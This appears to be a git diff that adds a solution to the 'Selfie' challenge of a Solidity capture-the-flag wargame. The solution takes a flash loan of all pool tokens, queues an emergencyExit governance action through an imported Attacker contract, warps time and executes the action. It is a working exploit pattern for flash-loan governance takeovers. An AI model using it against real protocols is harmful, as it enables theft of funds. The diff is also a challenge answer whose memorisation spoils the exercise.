@@ -3,9 +3,12 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {Attacker} from "./Attacker.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +65,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        console.log("player", player);
+        Attacker attacker = new Attacker(governance, pool, recovery);
+        pool.flashLoan(IERC3156FlashBorrower(address(attacker)), address(token), TOKENS_IN_POOL, abi.encodeWithSignature("emergencyExit(address)", recovery));
+        vm.warp(block.timestamp + 2 days);
+        governance.executeAction(1);
     }
 
     /**
